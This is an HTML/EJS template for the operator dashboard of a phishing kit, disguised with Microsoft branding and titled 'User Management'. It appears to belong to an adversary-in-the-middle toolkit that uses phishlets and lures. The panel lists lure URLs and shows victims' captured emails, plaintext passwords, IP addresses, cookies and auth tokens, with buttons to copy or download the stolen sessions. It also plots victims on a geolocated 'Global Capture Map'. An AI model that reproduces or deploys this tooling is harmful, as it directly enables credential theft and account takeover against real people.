<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>User Management - Microsoft</title>
    <!-- <link rel="icon" type="image/svg+xml" href="logo.svg" /> -->
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
    <style>
        :root {
            --bg-color: #121212;
            --bg-card: #1e1e1e;
            --bg-input: #2d2d2d;
            --border-color: #333;
            --text-primary: #ededed;
            --text-secondary: #a1a1aa;
            --accent-blue: #0078d4;
            --accent-blue-hover: #006abc;
            --accent-light: #60cdff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .dashboard-container {
            flex: 1;
            padding: 40px;
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
        }

        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .header-left .logo {
            width: 40px;
            height: 40px;
        }

        .header-title {
            font-size: 24px;
            font-weight: 600;
            color: white;
        }

        .header-subtitle {
            color: var(--text-secondary);
            font-size: 14px;
        }

        .btn-logout {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        .btn-logout:hover {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
        }

        .btn-action {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
            border-radius: 4px;
            border: 1px solid var(--border-color);
            background: transparent;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s ease;
            margin-right: 4px;
        }

        .btn-action:hover {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border-color: white;
        }

        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: var(--bg-card);
            border-radius: 8px;
            padding: 24px;
            border: 1px solid var(--border-color);
            position: relative;
        }

        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: var(--accent-light);
            margin-bottom: 8px;
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 14px;
        }

        /* User Table */
        .table-container {
            background: var(--bg-card);
            border-radius: 8px;
            border: 1px solid var(--border-color);
            overflow: hidden;
            margin-bottom: 32px;
        }

        .table-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 24px;
            border-bottom: 1px solid var(--border-color);
        }

        .table-title {
            font-size: 18px;
            font-weight: 600;
            color: white;
        }

        .btn-add {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.2s ease;
            text-decoration: none;
        }

        .btn-add:hover {
            background: var(--accent-blue-hover);
        }

        .users-table {
            width: 100%;
            border-collapse: collapse;
        }

        .users-table th,
        .users-table td {
            padding: 16px 24px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }

        .users-table th {
            background: rgba(0, 0, 0, 0.2);
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .users-table tr:hover {
            background: rgba(255, 255, 255, 0.02);
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            color: white;
        }

        .user-name {
            font-weight: 500;
            color: white;
        }

        .user-email {
            color: var(--text-secondary);
            font-size: 13px;
        }

        .password-cell {
            font-family: "Courier New", monospace;
            font-size: 12px;
            color: #10b981;
            background: rgba(16, 185, 129, 0.1);
            padding: 6px 10px;
            border-radius: 4px;
            display: inline-block;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .password-cell:hover {
            background: rgba(16, 185, 129, 0.2);
        }

        .password-cell.expanded {
            max-width: none;
            white-space: normal;
            word-break: break-all;
        }

        .status-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }

        .status-active {
            background: rgba(16, 185, 129, 0.15);
            color: #10b981;
        }

        .status-inactive {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
        }

        /* Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal {
            background: var(--bg-card);
            border-radius: 8px;
            padding: 32px;
            width: 100%;
            max-width: 600px;
            animation: modalSlideIn 0.3s ease;
            max-height: 80vh;
            overflow-y: auto;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 24px;
            color: white;
        }

        .btn-cancel {
            padding: 10px 24px;
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            margin-right: 12px;
        }

        .btn-cancel:hover {
            color: white;
            border-color: white;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .dashboard-container {
                padding: 20px;
            }

            .dashboard-header {
                flex-direction: column;
                gap: 16px;
                align-items: flex-start;
            }

            .users-table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
</head>

<body
    style="background-image: url('https://cdn.dribbble.com/users/1338391/screenshots/15482313/media/4e172856f6ce8968953d6C1d9f4f46a2.jpg'); background-size: cover; background-position: center;">
    <div
        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(18, 18, 18, 0.95); z-index: -1;">
    </div>

    <div class="dashboard-container">
        <!-- Header -->
        <header class="dashboard-header">
            <div class="header-left">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"
                    class="logo" />
                <div>
                    <h1 class="header-title">User Management</h1>
                    <p class="header-subtitle">
                        Manage your organization's users and credentials
                    </p>
                </div>
            </div>
            <div style="display: flex; gap: 12px">
                <a href="/settings" class="btn-logout" style="text-decoration: none">
                    Settings
                </a>
                <form action="/logout?_method=DELETE" method="POST" style="display:inline;">
                    <button type="submit" class="btn-logout" style="border-color: #ef4444; color: #ef4444">
                        Logout
                    </button>
                </form>
            </div>
        </header>
        
        <% if (messages && messages.success) { %>
            <div style="padding: 15px; margin-bottom: 20px; background: rgba(16, 185, 129, 0.2); border: 1px solid #10b981; color: #10b981; border-radius: 8px;">
                <%= messages.success %>
            </div>
        <% } %>
        <% if (messages && messages.error) { %>
            <div style="padding: 15px; margin-bottom: 20px; background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #ef4444; border-radius: 8px;">
                <%= messages.error %>
            </div>
        <% } %>

        <% const validData=data.filter(item=> {
            const user = item.username || item.email || '';
            return user && user.toLowerCase() !== 'unknown';
            });

            const sessions = validData.filter(d => d.tokens || d.cookies);
            
            function parseBrowser(ua) {
                if (!ua) return 'Unknown';
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edge')) return 'Edge';
                return 'Other';
            }
            function parseDevice(ua) {
                if (!ua) return 'Unknown';
                if (ua.includes('Windows')) return 'Windows';
                if (ua.includes('Mac')) return 'macOS';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
                if (ua.includes('Linux')) return 'Linux';
                return 'Other';
            }
            %>

            <!-- Stats Grid -->
            <div class="stats-grid">
                <div class="stat-card"
                    style="border-color: #dc2626; background: linear-gradient(135deg, var(--bg-card) 0%, rgba(220, 38, 38, 0.1) 100%);">
                    <div class="stat-value" style="color: #dc2626">
                        <%= validData.length %>
                    </div>
                    <div class="stat-label">Credentials Captured</div>
                </div>
                <div class="stat-card"
                    style="border-color: #8b5cf6; background: linear-gradient(135deg, var(--bg-card) 0%, rgba(139, 92, 246, 0.05) 100%);">
                    <div class="stat-value" style="color: #8b5cf6"><%= typeof lures !== 'undefined' ? lures.length : 0 %></div>
                    <div class="stat-label">Active Lures</div>
                </div>
                <div class="stat-card"
                    style="border-color: #f59e0b; background: linear-gradient(135deg, var(--bg-card) 0%, rgba(245, 158, 11, 0.05) 100%);">
                    <div class="stat-value" style="color: #f59e0b">
                        <%= sessions.length %>
                    </div>
                    <div class="stat-label">Sessions Extracted</div>
                </div>
            </div>

            <!-- Map View -->
            <div class="table-container" style="padding: 24px;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h2 class="table-title">Global Capture Map</h2>
                </div>
                <div id="map" style="width: 100%; height: 400px; border-radius: 8px; border: 1px solid var(--border-color); background: #1a1a1a;"></div>
            </div>

            <!-- Active Lures Table -->
            <div class="table-container">
                <div class="table-header">
                    <h2 class="table-title">
                        Active Lures
                    </h2>
                    <a href="/settings" class="btn-add" style="background: #8b5cf6">Add New</a>
                </div>
                <table class="users-table">
                    <thead>
                        <tr>
                            <th>Phishlet</th>
                            <th>Target URL</th>
                            <th>Redirect</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% if (typeof lures === 'undefined' || lures.length === 0) { %>
                            <tr>
                                <td colspan="4" style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                    No lures configured.
                                </td>
                            </tr>
                        <% } else { %>
                            <% lures.forEach(function(lure, index) { 
                                // Generate visual URL with subdomain
                                const sub = typeof phishletSubdomains !== 'undefined' ? phishletSubdomains[lure.phishlet] : '';
                                const fullHost = sub ? `${sub}.${lure.hostname}` : lure.hostname;
                                let visualUrl = `https://${fullHost}${lure.path}`;
                                if (lure.redirect_url) {
                                    const encoded = Buffer.from(lure.redirect_url).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
                                    visualUrl += `?r=${encoded}`;
                                }
                            %>
                            <tr>
                                <td>
                                    <span class="status-badge status-active" style="background: rgba(139, 92, 246, 0.15); color: #8b5cf6;">
                                        <%= lure.phishlet %>
                                    </span>
                                </td>
                                <td>
                                    <span class="password-cell" style="cursor: default" title="<%= visualUrl %>">
                                        <%= visualUrl.split('?')[0] %>
                                    </span>
                                </td>
                                <td style="color: #a1a1aa; font-size: 13px;">
                                    <%= lure.redirect_url || "None" %>
                                </td>
                                <td>
                                    <div style="display: flex;">
                                        <button class="btn-action" title="Copy URL" onclick="copyLureUrl('<%= visualUrl %>')">
                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
                                            </svg>
                                        </button>
                                        <form action="/delete-lure" method="POST" style="display:inline;" onsubmit="return confirm('Delete this lure?');">
                                            <input type="hidden" name="index" value="<%= index %>">
                                            <button type="submit" class="btn-action" title="Delete Lure" style="color: #ef4444; border-color: rgba(239, 68, 68, 0.3);">
                                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                    <polyline points="3 6 5 6 21 6"></polyline>
                                                    <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                                                </svg>
                                            </button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                            <% }); %>
                        <% } %>
                    </tbody>
                </table>
            </div>

            <!-- Credentials Table -->
            <div class="table-container">
                <div class="table-header">
                    <h2 class="table-title">
                        Captured Credentials
                    </h2>
                    <button class="btn-add" onclick="window.location.reload()"
                        style="background: #dc2626">Refresh</button>
                </div>
                <div style="overflow-x: auto;">
                    <table class="users-table" style="min-width: 900px;">
                        <thead>
                            <tr>
                                <th>Email</th>
                                <th>Password</th>
                                <th>Status</th>
                                <th>IP Address</th>
                                <th>Country</th>
                                <th>Browser</th>
                                <th>Device</th>
                                <th>Captured At</th>
                            </tr>
                        </thead>
                        <tbody>
                            <% if (validData.length===0) { %>
                                <tr>
                                    <td colspan="8"
                                        style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                        No credentials captured yet.
                                    </td>
                                </tr>
                                <% } %>
                                    <% validData.forEach(function(item, index) { const dateStr=item.create_time ? new
                                        Date(item.create_time * 1000).toLocaleString() : (item.time || "Just now" ); %>
                                        <tr>
                                            <td>
                                                <div class="user-info">
                                                    <div class="user-avatar"
                                                        style="background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
                                                        <%= (item.username || item.email || "?" ).charAt(0).toUpperCase() %>
                                                    </div>
                                                    <div>
                                                        <div class="user-name" onclick="copyText(this)"
                                                            style="cursor: pointer; transition: color 0.2s;"
                                                            title="Click to copy">
                                                            <%= item.username || item.email %>
                                                        </div>
                                                    </div>
                                                </div>
                                            </td>
                                            <td>
                                                <span class="password-cell" onclick="copyText(this)" title="Click to copy">
                                                    <%= item.password || "***" %>
                                                </span>
                                            </td>
                                            <td>
                                                <span class="status-badge status-active">Verified</span>
                                            </td>
                                            <td
                                                style="font-family: 'Courier New', monospace; font-size: 13px; color: #a1a1aa;">
                                                <%= item.remote_addr || item.remote_ip || "N/A" %>
                                            </td>
                                            <td style="color: #ededed; font-size: 13px;" id="country-<%= index %>">
                                                Loading...
                                            </td>
                                            <td style="color: #a1a1aa; font-size: 13px;">
                                                <%= parseBrowser(item.useragent) %>
                                            </td>
                                            <td style="color: #a1a1aa; font-size: 13px;">
                                                <%= parseDevice(item.useragent) %>
                                            </td>
                                            <td style="color: #a1a1aa; font-size: 13px;">
                                                <%= dateStr %>
                                            </td>
                                        </tr>
                                        <% }); %>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Cookies/Tokens Table -->
            <div class="table-container">
                <div class="table-header">
                    <h2 class="table-title">
                        Captured Sessions
                    </h2>
                </div>
                <table class="users-table">
                    <thead>
                        <tr>
                            <th>Email</th>
                            <th>Cookie Count</th>
                            <th>Auth Tokens</th>
                            <th>Extracted At</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% if (sessions.length===0) { %>
                            <tr>
                                <td colspan="5"
                                    style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                    No sessions captured yet.
                                </td>
                            </tr>
                            <% } %>
                                <% sessions.forEach(function(item) { const cookieCount=Object.keys(item.cookies ||
                                    {}).length + (item.tokens ? Object.keys(item.tokens).length : 0); const
                                    tokenCount=item.tokens ? Object.keys(item.tokens).length : 0; const
                                    dateStr=item.create_time ? new Date(item.create_time * 1000).toLocaleString() :
                                    (item.time || "Just now" ); %>
                                    <tr>
                                        <td>
                                            <div class="user-info">
                                                <div class="user-avatar"
                                                    style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);">
                                                    S</div>
                                                <div class="user-name" onclick="copyText(this)" style="cursor: pointer;"
                                                    title="Click to copy">
                                                    <%= item.username || item.email %>
                                                </div>
                                            </div>
                                        </td>
                                        <td>
                                            <span class="status-badge status-active">
                                                <%= cookieCount %>
                                            </span>
                                        </td>
                                        <td>
                                            <span
                                                class="status-badge <%= tokenCount > 0 ? 'status-active' : 'status-inactive' %>">
                                                <%= tokenCount %>
                                            </span>
                                        </td>
                                        <td style="color: #a1a1aa;">
                                            <%= dateStr %>
                                        </td>
                                        <td>
                                            <div style="display: flex;">
                                                <button class="btn-action" title="View"
                                                    onclick='showSessionModal(<%= JSON.stringify(item) %>)'>
                                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                        stroke="currentColor" stroke-width="2">
                                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                                        <circle cx="12" cy="12" r="3" />
                                                    </svg>
                                                </button>
                                                <button class="btn-action" title="Copy"
                                                    onclick='copySessionData(<%= JSON.stringify(item) %>)'>
                                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                        stroke="currentColor" stroke-width="2">
                                                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                        <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
                                                    </svg>
                                                </button>
                                                <button class="btn-action" title="Download"
                                                    onclick='downloadSessionData(<%= JSON.stringify(item) %>)'>
                                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                        stroke="currentColor" stroke-width="2">
                                                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                                                        <polyline points="7 10 12 15 17 10" />
                                                        <line x1="12" y1="15" x2="12" y2="3" />
                                                    </svg>
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                    <% }); %>
                    </tbody>
                </table>
            </div>

    </div>

    <!-- Session Modal -->
    <div class="modal-overlay" id="sessionModal">
        <div class="modal">
            <h3 class="modal-title">Session Details</h3>
            <div id="sessionSummary" style="margin-bottom: 20px; line-height: 1.8;"></div>

            <h4 style="color: #f59e0b; margin-bottom: 10px;">🍪 All Cookies</h4>
            <div id="sessionContent"
                style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; color: #a1a1aa; max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 4px;">
            </div>

            <div style="margin-top: 24px; display: flex; justify-content: flex-end;">
                <button class="btn-cancel"
                    onclick="document.getElementById('sessionModal').classList.remove('active')">Close</button>
                <button class="btn-add" onclick="copySessionContent()">Copy All</button>
            </div>
        </div>
    </div>

    <script>
        let currentSessionItem = null;

        function showSessionModal(item) {
            currentSessionItem = item;

            const cookieCount = Object.keys(item.cookies || {}).length + (item.tokens ? Object.keys(item.tokens).length : 0);
            const tokenCount = item.tokens ? Object.keys(item.tokens).length : 0;

            // Format Date
            const dateStr = item.create_time ? new Date(item.create_time * 1000).toLocaleString() : 'N/A';

            // Build summary
            const summaryHTML = `
                <strong>Username:</strong> ${item.username || item.email || 'Unknown'}<br>
                <strong>IP:</strong> ${item.remote_addr || item.remote_ip || 'N/A'}<br>
                <strong>System:</strong> ${item.useragent ? parseUA(item.useragent) : 'Unknown'}<br>
                <strong>Date:</strong> ${dateStr}<br>
                <strong>Session ID:</strong> ${item.id || item.sessionId || 'N/A'}<br>
                <strong>Total Cookies:</strong> ${cookieCount}<br>
                <strong>Auth Tokens:</strong> ${tokenCount}
            `;
            document.getElementById('sessionSummary').innerHTML = summaryHTML;

            // Format cookies & tokens for display
            let contentText = "";
            if (item.tokens && Object.keys(item.tokens).length > 0) {
                contentText += "=== AUTH TOKENS ===\n";
                contentText += JSON.stringify(item.tokens, null, 2) + "\n\n";
            }
            if (item.cookies && Object.keys(item.cookies).length > 0) {
                contentText += "=== COOKIES ===\n";
                contentText += JSON.stringify(item.cookies, null, 2);
            }

            document.getElementById('sessionContent').textContent = contentText || "No session data available.";
            document.getElementById('sessionModal').classList.add('active');
        }

        function copySessionContent() {
            const content = document.getElementById('sessionContent').textContent;
            if (content) {
                navigator.clipboard.writeText(content).then(() => {
                    alert("Session content copied!");
                });
            }
        }

        function copySessionData(item) {
            const dataToCopy = JSON.stringify(item, null, 2);
            navigator.clipboard.writeText(dataToCopy).then(() => {
                alert("Full session JSON copied to clipboard!");
            });
        }

        function downloadSessionData(item) {
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(item, null, 2));
            const downloadAnchorNode = document.createElement('a');
            downloadAnchorNode.setAttribute("href", dataStr);
            const filename = "session_" + (item.username || "unknown") + ".json";
            downloadAnchorNode.setAttribute("download", filename);
            document.body.appendChild(downloadAnchorNode);
            downloadAnchorNode.click();
            downloadAnchorNode.remove();
        }

        function copyText(element) {
            const text = element.innerText || element.textContent;
            if (text && text.trim() !== '***') {
                copyString(text.trim(), element);
            }
        }
        
        function copyLureUrl(url) {
            copyString(url, null);
            alert("Lure URL copied to clipboard!");
        }

        function copySessionContent() {
            const content = document.getElementById('sessionContent').textContent;
            if (content) {
                copyString(content);
                alert("Session content copied!");
            }
        }

        function copySessionData(item) {
            const dataToCopy = JSON.stringify(item, null, 2);
            copyString(dataToCopy);
            alert("Full session JSON copied to clipboard!");
        }
        
        function copyString(text, element) {
            const copyToClipboard = (str) => {
                if (navigator.clipboard && window.isSecureContext) {
                    return navigator.clipboard.writeText(str);
                } else {
                    let textArea = document.createElement("textarea");
                    textArea.value = str;
                    textArea.style.position = "fixed";
                    textArea.style.left = "-999999px";
                    textArea.style.top = "-999999px";
                    document.body.appendChild(textArea);
                    textArea.focus();
                    textArea.select();
                    return new Promise((res, rej) => {
                        document.execCommand('copy') ? res() : rej();
                        textArea.remove();
                    });
                }
            };

            copyToClipboard(text).then(() => {
                if (element) {
                    const originalColor = element.style.color;
                    element.style.color = '#60cdff';
                    setTimeout(() => {
                        element.style.color = originalColor;
                    }, 200);
                }
            }).catch(err => {
                console.error('Failed to copy: ', err);
                // Fallback alert for very old browsers or extreme issues
                alert("Could not copy automatically. Please select and copy manually.");
            });
        }

        function parseUA(ua) {
            if (!ua) return "Unknown";
            if (ua.includes("Windows")) return "Windows";
            if (ua.includes("Mac")) return "macOS";
            if (ua.includes("Android")) return "Android";
            if (ua.includes("iPhone")) return "iOS";
            return "Other";
        }

        // --- MAP AND GEO LOGIC ---
        const capturesForMap = <%- JSON.stringify(validData.map((item, index) => ({
            id: "country-" + index,
            ip: item.remote_addr || item.remote_ip || '',
            email: item.username || item.email || ''
        }))) %>;

        // Initialize CartoDB Dark Matter map (looks great on dark themes)
        const map = L.map('map').setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
            subdomains: 'abcd',
            maxZoom: 20
        }).addTo(map);

        const ipCache = {};

        async function processMapData() {
            for (const item of capturesForMap) {
                if (!item.ip || item.ip === 'N/A' || item.ip === '127.0.0.1' || item.ip === 'localhost') {
                    const el = document.getElementById(item.id);
                    if(el) el.textContent = 'Local/Unknown';
                    continue;
                }

                try {
                    let geo = ipCache[item.ip];
                    if (!geo) {
                        const res = await fetch(`https://get.geojs.io/v1/ip/geo/${item.ip}.json`);
                        geo = await res.json();
                        ipCache[item.ip] = geo;
                    }

                    if (geo && geo.country) {
                        const el = document.getElementById(item.id);
                        if (el) {
                            el.innerHTML = `<img src="https://flagcdn.com/16x12/${geo.country_code.toLowerCase()}.png" alt="${geo.country}" style="vertical-align: middle; margin-right: 6px; border-radius: 2px;"> ${geo.country}`;
                        }

                        if (geo.latitude && geo.longitude) {
                            const marker = L.marker([geo.latitude, geo.longitude]).addTo(map);
                            const popupContent = `
                                <div style="color: #1a1a1a; padding: 4px;">
                                    <strong style="color: #0078d4; font-size: 14px;">${item.email}</strong><br>
                                    <span style="font-size: 12px; color: #666;">IP: ${item.ip}</span><br>
                                    <span style="font-size: 12px; color: #666;">Loc: ${geo.country}</span>
                                </div>
                            `;
                            marker.bindPopup(popupContent);
                        }
                    } else {
                        const el = document.getElementById(item.id);
                        if(el) el.textContent = 'Unknown';
                    }
                } catch (e) {
                    const el = document.getElementById(item.id);
                    if(el) el.textContent = 'Error';
                }

                // Small delay to avoid API hammering if there are hundreds of rows
                await new Promise(r => setTimeout(r, 100));
            }
        }

        document.addEventListener('DOMContentLoaded', processMapData);
    </script>
</body>

</html>